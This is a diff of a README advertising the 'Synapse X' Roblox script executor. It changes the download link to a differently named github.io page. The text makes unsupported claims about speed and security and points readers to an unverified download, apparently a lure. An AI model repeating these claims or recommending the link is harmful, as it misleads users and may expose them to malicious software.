@@ -2,7 +2,7 @@
 
 **Synapse X** is the most powerful and stable script executor for Roblox, providing full compatibility with advanced scripts and custom mods. Known for its speed, security, and superior execution environment, Synapse X remains the top tool for Roblox developers and players alike.
 
-[![Download Synapse X](https://img.shields.io/badge/Download-Synapse_X-blueviolet)](https://synapse-x-roblox-executor.github.io/.github)
+[![Download Synapse X](https://img.shields.io/badge/Download-Synapse_X-blueviolet)](https://cherax-mod-menu-download.github.io/.github/)
 
 ---
 
